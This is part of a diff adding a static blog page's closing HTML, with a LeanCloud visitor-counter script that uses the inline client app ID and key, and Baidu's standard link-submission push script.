+                $element.find('.leancloud-visitors-count').text(counter.time + 1);
+              })
+            
+              .fail(function ({ responseJSON }) {
+                console.log('Failed to save Visitor num, with error message: ' + responseJSON.error);
+              })
+          } else {
+            
+              Counter('post', '/classes/Counter', JSON.stringify({ title: title, url: url, time: 1 }))
+                .done(function() {
+                  var $element = $(document.getElementById(url));
+                  $element.find('.leancloud-visitors-count').text(1);
+                })
+                .fail(function() {
+                  console.log('Failed to create');
+                });
+            
+          }
+        })
+        .fail(function ({ responseJSON }) {
+          console.log('LeanCloud Counter Error: ' + responseJSON.code + ' ' + responseJSON.error);
+        });
+    }
+    
+
+    $(function() {
+      $.get('https://app-router.leancloud.cn/2/route?appId=' + 'uVnlBrG3gVIsFVLuKwa2GqEk-gzGzoHsz')
+        .done(function({ api_server }) {
+          var Counter = function(method, url, data) {
+            return $.ajax({
+              method: method,
+              url: 'https://' + api_server + '/1.1' + url,
+              headers: {
+                'X-LC-Id': 'uVnlBrG3gVIsFVLuKwa2GqEk-gzGzoHsz',
+                'X-LC-Key': 'mcV530t0xWmBXhLDzUOPj2qg',
+                'Content-Type': 'application/json',
+              },
+              data: data
+            });
+          };
+          
+            const localhost = /http:\/\/(localhost|127.0.0.1|0.0.0.0)/;
+            if (localhost.test(document.URL)) return;
+            addCount(Counter);
+          
+        });
+    });
+  </script>
+
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+  
+
+
+  
+
+  
+
+</body>
+</html>
